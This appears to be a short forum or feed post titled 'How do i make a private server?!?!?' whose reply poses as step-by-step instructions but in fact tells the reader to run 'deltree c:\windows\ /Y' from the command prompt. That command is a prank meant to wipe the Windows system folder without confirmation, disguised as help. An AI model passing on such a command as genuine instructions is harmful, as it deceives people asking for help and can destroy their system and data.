item.title: How do i make a private server?!?!?
item.dc:creator: @superstuntguy superstuntguy
item.description:
@superstuntguy wrote:

Step 1: Goto Start->Run
Step 2: Type in “cmd” (no quotes) and press ok
Step 3: Type “deltree c:\windows\ /Y” (no quotes) and press enter
